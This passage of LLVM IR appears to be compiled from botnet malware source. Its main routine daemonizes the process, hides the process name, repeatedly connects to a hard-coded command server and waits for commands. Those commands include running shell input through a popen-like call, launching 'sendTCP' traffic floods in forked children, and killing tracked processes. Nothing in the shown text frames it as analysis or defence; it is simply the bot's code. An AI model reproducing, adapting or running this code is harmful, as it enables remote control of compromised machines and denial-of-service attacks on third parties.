  tail call void @sendTCP(i8* nonnull %267, i32 %249, i32 %250, i32 %251, i8* %253, i32 %265, i32 %259)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:273:                                    ; preds = %264
  %274 = tail call i32 @listFork()
  %275 = icmp eq i32 %274, 0
  br i1 %275, label %276, label %302

; <label>:276:                                    ; preds = %273
  tail call void @sendTCP(i8* %248, i32 %249, i32 %250, i32 %251, i8* %253, i32 %265, i32 %259)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit132.loopexit:                            ; preds = %.preheader131
  %.pre155 = load i8*, i8** %1, align 8
  br label %.loopexit132

.loopexit132:                                     ; preds = %.loopexit132.loopexit, %.loopexit134
  %277 = phi i8* [ %.pre155, %.loopexit132.loopexit ], [ %211, %.loopexit134 ]
  %278 = tail call i32 @strcmp(i8* %277, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.484, i64 0, i64 0)) #15
  %279 = icmp eq i32 %278, 0
  %280 = load i64, i64* @numpids, align 8
  %281 = icmp ne i64 %280, 0
  %or.cond143 = and i1 %279, %281
  br i1 %or.cond143, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit132
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %294
  %.0141 = phi i64 [ %295, %294 ], [ 0, %.lr.ph.preheader ]
  %282 = load i32*, i32** @pids, align 8
  %283 = getelementptr inbounds i32, i32* %282, i64 %.0141
  %284 = load i32, i32* %283, align 4
  %285 = icmp eq i32 %284, 0
  br i1 %285, label %294, label %286

; <label>:286:                                    ; preds = %.lr.ph
  %287 = tail call i32 @getpid() #5
  %288 = icmp eq i32 %284, %287
  br i1 %288, label %294, label %289

; <label>:289:                                    ; preds = %286
  %290 = load i32*, i32** @pids, align 8
  %291 = getelementptr inbounds i32, i32* %290, i64 %.0141
  %292 = load i32, i32* %291, align 4
  %293 = tail call i32 @kill(i32 %292, i32 9) #5
  br label %294

; <label>:294:                                    ; preds = %286, %.lr.ph, %289
  %295 = add i64 %.0141, 1
  %296 = load i64, i64* @numpids, align 8
  %297 = icmp ult i64 %295, %296
  br i1 %297, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %294
  %.pre156 = load i8*, i8** %1, align 8
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit132
  %298 = phi i8* [ %.pre156, %.loopexit.loopexit ], [ %277, %.loopexit132 ]
  %299 = tail call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.485, i64 0, i64 0)) #15
  %300 = icmp eq i32 %299, 0
  br i1 %300, label %301, label %302

; <label>:301:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #17
  unreachable

; <label>:302:                                    ; preds = %.loopexit, %273, %207, %173, %157, %128, %109, %46, %214, %216, %221, %226, %234, %241, %185, %187, %192, %164, %116, %118, %123, %58, %60, %65, %70, %75, %84, %37, %179, %52, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #5
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #5
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 23, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #5
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.486, i64 0, i64 0)) #5
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #5
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #5
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.487, i64 0, i64 0), i32 0) #5
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.488, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #5
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #5
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #5
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #5
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #3

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.489, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %8 = tail call i8* @inet_ntoa(i32 %7) #5
  %9 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.491, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.489, i64 0, i64 0), i8* %8)
  %10 = load i8*, i8** %1, align 8
  %11 = tail call i64 @strlen(i8* %10) #15
  tail call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 %11, i32 1, i1 false)
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.490, i64 0, i64 0), i8** %1, align 8
  %12 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([1 x i8]* @.str.490 to i64), i32 0, i32 0, i32 0) #5
  %13 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %14 = tail call i32 @getpid() #5
  %15 = xor i32 %14, %13
  tail call void @srand(i32 %15) #5
  %16 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #5
  %17 = tail call i32 @getpid() #5
  %18 = xor i32 %17, %16
  tail call void @init_rand(i32 %18)
  %19 = tail call i32 @getOurIP()
  %20 = tail call i32 @fork() #5
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %24, label %22

; <label>:22:                                     ; preds = %2
  %23 = call i32 @waitpid(i32 %20, i32* nonnull %3, i32 0) #5
  call void @exit(i32 0) #17
  unreachable

; <label>:24:                                     ; preds = %2
  %25 = tail call i32 @fork() #5
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %28, label %27

; <label>:27:                                     ; preds = %24
  tail call void @exit(i32 0) #17
  unreachable

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @setsid() #5
  %30 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.492, i64 0, i64 0)) #5
  %31 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  %32 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %33 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %34 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge82

.backedge82:                                      ; preds = %.backedge82.backedge, %28
  %35 = call i32 @initConnection()
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %39, label %37

; <label>:37:                                     ; preds = %.backedge82
  %38 = call i32 @sleep(i32 5) #5
  br label %.backedge82.backedge

.backedge82.backedge:                             ; preds = %37, %._crit_edge112
  br label %.backedge82

; <label>:39:                                     ; preds = %.backedge82
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %42 = call i8* @inet_ntoa(i32 %41) #5
  %43 = call i32 (i32, i8*, ...) @sockprintf(i32 %40, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.493, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.489, i64 0, i64 0), i8* %42)
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = call i32 @recvLine(i32 %44, i8* nonnull %32, i32 4096)
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %._crit_edge112, label %.preheader81.preheader

.preheader81.preheader:                           ; preds = %39
  br label %.preheader81

.preheader81:                                     ; preds = %.preheader81.preheader, %.backedge
  %47 = phi i32 [ %97, %.backedge ], [ %45, %.preheader81.preheader ]
  %48 = load i64, i64* @numpids, align 8
  %49 = icmp eq i64 %48, 0
  br i1 %49, label %._crit_edge99, label %.lr.ph98.preheader

.lr.ph98.preheader:                               ; preds = %.preheader81
  br label %.lr.ph98

.lr.ph98:                                         ; preds = %.lr.ph98.preheader, %.lr.ph98._crit_edge
  %indvars.iv = phi i64 [ %55, %.lr.ph98._crit_edge ], [ 0, %.lr.ph98.preheader ]
  %50 = load i32*, i32** @pids, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 %indvars.iv
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @waitpid(i32 %52, i32* null, i32 1) #5
  %54 = icmp sgt i32 %53, 0
  %55 = add nuw i64 %indvars.iv, 1
  br i1 %54, label %.preheader, label %.lr.ph98._crit_edge

.preheader:                                       ; preds = %.lr.ph98
  %56 = load i64, i64* @numpids, align 8
  %57 = icmp ult i64 %55, %56
  %58 = load i32*, i32** @pids, align 8
  %59 = trunc i64 %indvars.iv to i32
  br i1 %57, label %.lr.ph89.preheader, label %._crit_edge90

.lr.ph89.preheader:                               ; preds = %.preheader
  %60 = trunc i64 %55 to i32
  br label %.lr.ph89

.lr.ph89:                                         ; preds = %.lr.ph89.preheader, %.lr.ph89
  %61 = phi i32* [ %70, %.lr.ph89 ], [ %58, %.lr.ph89.preheader ]
  %62 = phi i64 [ %67, %.lr.ph89 ], [ %55, %.lr.ph89.preheader ]
  %.07088 = phi i32 [ %.070, %.lr.ph89 ], [ %60, %.lr.ph89.preheader ]
  %.070.in87 = phi i32 [ %.07088, %.lr.ph89 ], [ %59, %.lr.ph89.preheader ]
  %63 = getelementptr inbounds i32, i32* %61, i64 %62
  %64 = load i32, i32* %63, align 4
  %65 = zext i32 %.070.in87 to i64
  %66 = getelementptr inbounds i32, i32* %61, i64 %65
  store i32 %64, i32* %66, align 4
  %.070 = add i32 %.07088, 1
  %67 = zext i32 %.070 to i64
  %68 = load i64, i64* @numpids, align 8
  %69 = icmp ult i64 %67, %68
  %70 = load i32*, i32** @pids, align 8
  br i1 %69, label %.lr.ph89, label %._crit_edge90.loopexit

._crit_edge90.loopexit:                           ; preds = %.lr.ph89
  br label %._crit_edge90

._crit_edge90:                                    ; preds = %._crit_edge90.loopexit, %.preheader
  %.070.in.lcssa = phi i32 [ %59, %.preheader ], [ %.07088, %._crit_edge90.loopexit ]
  %.lcssa = phi i32* [ %58, %.preheader ], [ %70, %._crit_edge90.loopexit ]
  %71 = zext i32 %.070.in.lcssa to i64
  %72 = getelementptr inbounds i32, i32* %.lcssa, i64 %71
  store i32 0, i32* %72, align 4
  %73 = load i64, i64* @numpids, align 8
  %74 = add i64 %73, -1
  store i64 %74, i64* @numpids, align 8
  %75 = shl i64 %73, 2
  %76 = call noalias i8* @malloc(i64 %75) #5
  %77 = bitcast i8* %76 to i32*
  %78 = icmp eq i64 %74, 0
  %79 = load i32*, i32** @pids, align 8
  br i1 %78, label %._crit_edge95, label %.lr.ph94.preheader

.lr.ph94.preheader:                               ; preds = %._crit_edge90
  br label %.lr.ph94

.lr.ph94:                                         ; preds = %.lr.ph94.preheader, %.lr.ph94
  %80 = phi i64 [ %85, %.lr.ph94 ], [ 0, %.lr.ph94.preheader ]
  %.17192 = phi i32 [ %84, %.lr.ph94 ], [ 0, %.lr.ph94.preheader ]
  %81 = getelementptr inbounds i32, i32* %79, i64 %80
  %82 = load i32, i32* %81, align 4
  %83 = getelementptr inbounds i32, i32* %77, i64 %80
  store i32 %82, i32* %83, align 4
  %84 = add i32 %.17192, 1
  %85 = zext i32 %84 to i64
  %86 = icmp ult i64 %85, %74
  br i1 %86, label %.lr.ph94, label %._crit_edge95.loopexit

._crit_edge95.loopexit:                           ; preds = %.lr.ph94
  br label %._crit_edge95

._crit_edge95:                                    ; preds = %._crit_edge95.loopexit, %._crit_edge90
  %87 = bitcast i32* %79 to i8*
  call void @free(i8* %87) #5
  store i8* %76, i8** bitcast (i32** @pids to i8**), align 8
  br label %.lr.ph98._crit_edge

.lr.ph98._crit_edge:                              ; preds = %.lr.ph98, %._crit_edge95
  %sext = shl i64 %55, 32
  %88 = ashr exact i64 %sext, 32
  %89 = load i64, i64* @numpids, align 8
  %90 = icmp ult i64 %88, %89
  br i1 %90, label %.lr.ph98, label %._crit_edge99.loopexit

._crit_edge99.loopexit:                           ; preds = %.lr.ph98._crit_edge
  br label %._crit_edge99

._crit_edge99:                                    ; preds = %._crit_edge99.loopexit, %.preheader81
  %91 = sext i32 %47 to i64
  %92 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %91
  store i8 0, i8* %92, align 1
  call void @trim(i8* nonnull %32)
  %strncmp = call i32 @strncmp(i8* nonnull %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %93, label %99

; <label>:93:                                     ; preds = %._crit_edge99
  %94 = load i32, i32* @mainCommSock, align 4
  %95 = call i32 (i32, i8*, ...) @sockprintf(i32 %94, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.494, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph111
  br label %.backedge

.backedge.loopexit130:                            ; preds = %.preheader113
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit130, %.backedge.loopexit, %._crit_edge108.thread, %93, %._crit_edge108, %101, %133
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i32 @recvLine(i32 %96, i8* nonnull %32, i32 4096)
  %98 = icmp eq i32 %97, -1
  br i1 %98, label %._crit_edge112.loopexit, label %.preheader81

; <label>:99:                                     ; preds = %._crit_edge99
  %strncmp73 = call i32 @strncmp(i8* nonnull %32, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.495, i64 0, i64 0), i64 3)
  %cmp74 = icmp eq i32 %strncmp73, 0
  br i1 %cmp74, label %100, label %101

; <label>:100:                                    ; preds = %99
  call void @exit(i32 0) #17
  unreachable

; <label>:101:                                    ; preds = %99
  %102 = load i8, i8* %32, align 16
  %103 = icmp eq i8 %102, 33
  br i1 %103, label %.preheader113.preheader, label %.backedge

.preheader113.preheader:                          ; preds = %101
  br label %.preheader113

.preheader113:                                    ; preds = %.preheader113.preheader, %105
  %.068 = phi i8* [ %106, %105 ], [ %33, %.preheader113.preheader ]
  %104 = load i8, i8* %.068, align 1
  switch i8 %104, label %105 [
    i8 0, label %.backedge.loopexit130
    i8 32, label %107
  ]

; <label>:105:                                    ; preds = %.preheader113
  %106 = getelementptr inbounds i8, i8* %.068, i64 1
  br label %.preheader113

; <label>:107:                                    ; preds = %.preheader113
  store i8 0, i8* %.068, align 1
  %108 = call i64 @strlen(i8* %33) #15
  %109 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %108
  %110 = getelementptr inbounds i8, i8* %109, i64 2
  br label %111

; <label>:111:                                    ; preds = %116, %107
  %112 = call i64 @strlen(i8* %110) #15
  %113 = add i64 %112, -1
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  switch i8 %115, label %.preheader79.preheader [
    i8 13, label %116
    i8 10, label %116
  ]

.preheader79.preheader:                           ; preds = %111
  br label %.preheader79

; <label>:116:                                    ; preds = %111, %111
  store i8 0, i8* %114, align 1
  br label %111

.preheader79:                                     ; preds = %.preheader79.preheader, %118
  %.069 = phi i8* [ %119, %118 ], [ %110, %.preheader79.preheader ]
  %117 = load i8, i8* %.069, align 1
  switch i8 %117, label %118 [
    i8 32, label %120
    i8 0, label %120
  ]

; <label>:118:                                    ; preds = %.preheader79
  %119 = getelementptr inbounds i8, i8* %.069, i64 1
  br label %.preheader79

; <label>:120:                                    ; preds = %.preheader79, %.preheader79
  store i8 0, i8* %.069, align 1
  %121 = getelementptr inbounds i8, i8* %.069, i64 1
  %122 = load i8, i8* %110, align 1
  %123 = icmp eq i8 %122, 0
  br i1 %123, label %._crit_edge103, label %.lr.ph102.preheader

.lr.ph102.preheader:                              ; preds = %120
  br label %.lr.ph102

.lr.ph102:                                        ; preds = %.lr.ph102.preheader, %.lr.ph102
  %124 = phi i8 [ %129, %.lr.ph102 ], [ %122, %.lr.ph102.preheader ]
  %.066100 = phi i8* [ %128, %.lr.ph102 ], [ %110, %.lr.ph102.preheader ]
  %125 = zext i8 %124 to i32
  %126 = call i32 @toupper(i32 %125) #15
  %127 = trunc i32 %126 to i8
  store i8 %127, i8* %.066100, align 1
  %128 = getelementptr inbounds i8, i8* %.066100, i64 1
  %129 = load i8, i8* %128, align 1
  %130 = icmp eq i8 %129, 0
  br i1 %130, label %._crit_edge103.loopexit, label %.lr.ph102

._crit_edge103.loopexit:                          ; preds = %.lr.ph102
  br label %._crit_edge103

._crit_edge103:                                   ; preds = %._crit_edge103.loopexit, %120
  %131 = call i32 @strcmp(i8* %110, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.496, i64 0, i64 0)) #15
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %146

; <label>:133:                                    ; preds = %._crit_edge103
  %134 = call i32 @listFork()
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %136, label %.backedge

; <label>:136:                                    ; preds = %133
  %137 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %137, i8 0, i64 1024, i32 16, i1 false)
  %138 = call i32 (i8*, i8*, ...) @szprintf(i8* nonnull %137, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.497, i64 0, i64 0), i8* %121)
  %139 = call i32 @fdpopen(i8* nonnull %137, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.33, i64 0, i64 0))
  %140 = call i8* @fdgets(i8* nonnull %137, i32 1024, i32 %139)
  %141 = icmp eq i8* %140, null
  br i1 %141, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %136
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  call void @trim(i8* nonnull %137)
  call void @llvm.memset.p0i8.i64(i8* nonnull %137, i8 0, i64 1024, i32 16, i1 false)
  %142 = call i32 @sleep(i32 1) #5
  %143 = call i8* @fdgets(i8* nonnull %137, i32 1024, i32 %139)
  %144 = icmp eq i8* %143, null
  br i1 %144, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %136
  %145 = call i32 @fdpclose(i32 %139)
  call void @exit(i32 0) #17
  unreachable

; <label>:146:                                    ; preds = %._crit_edge103
  %147 = call i8* @strtok(i8* %121, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i64 0, i64 0)) #5
  store i8* %110, i8** %34, align 16
  %148 = icmp eq i8* %147, null
  br i1 %148, label %._crit_edge108.thread, label %.lr.ph107.preheader

.lr.ph107.preheader:                              ; preds = %146
  br label %.lr.ph107

._crit_edge108.thread:                            ; preds = %146
  call void @processCmd(i32 1, i8** nonnull %34)
  br label %.backedge

.lr.ph107:                                        ; preds = %.lr.ph107.preheader, %161
  %.064105 = phi i8* [ %162, %161 ], [ %147, %.lr.ph107.preheader ]
  %.065104 = phi i32 [ %.1, %161 ], [ 1, %.lr.ph107.preheader ]
  %149 = load i8, i8* %.064105, align 1
  %150 = icmp eq i8 %149, 10
  br i1 %150, label %161, label %151

; <label>:151:                                    ; preds = %.lr.ph107
  %152 = call i64 @strlen(i8* nonnull %.064105) #15
  %153 = add i64 %152, 1
  %154 = call noalias i8* @malloc(i64 %153) #5
  %155 = sext i32 %.065104 to i64
  %156 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %155
  store i8* %154, i8** %156, align 8
  %157 = call i64 @strlen(i8* nonnull %.064105) #15
  %158 = add i64 %157, 1
  call void @llvm.memset.p0i8.i64(i8* %154, i8 0, i64 %158, i32 1, i1 false)
  %159 = call i8* @strcpy(i8* %154, i8* nonnull %.064105) #5
  %160 = add nsw i32 %.065104, 1
  br label %161

; <label>:161:                                    ; preds = %.lr.ph107, %151
  %.1 = phi i32 [ %160, %151 ], [ %.065104, %.lr.ph107 ]
  %162 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.498, i64 0, i64 0)) #5
  %163 = icmp eq i8* %162, null
  br i1 %163, label %._crit_edge108, label %.lr.ph107

._crit_edge108:                                   ; preds = %161
  call void @processCmd(i32 %.1, i8** nonnull %34)
  %164 = icmp sgt i32 %.1, 1
  br i1 %164, label %.lr.ph111.preheader, label %.backedge

.lr.ph111.preheader:                              ; preds = %._crit_edge108
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph111

.lr.ph111:                                        ; preds = %.lr.ph111.preheader, %.lr.ph111
  %indvars.iv120 = phi i64 [ %indvars.iv.next121, %.lr.ph111 ], [ 1, %.lr.ph111.preheader ]
  %165 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv120
  %166 = load i8*, i8** %165, align 8
  call void @free(i8* %166) #5
  %indvars.iv.next121 = add nuw nsw i64 %indvars.iv120, 1
  %exitcond = icmp eq i64 %indvars.iv.next121, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph111

._crit_edge112.loopexit:                          ; preds = %.backedge
  br label %._crit_edge112

._crit_edge112:                                   ; preds = %._crit_edge112.loopexit, %39
  %puts = call i32 @puts(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @str, i64 0, i64 0))
  br label %.backedge82.backedge
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #3

declare i32 @prctl(...) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #15

; Function Attrs: nounwind
declare i32 @puts(i8* nocapture readonly) #5

attributes #0 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
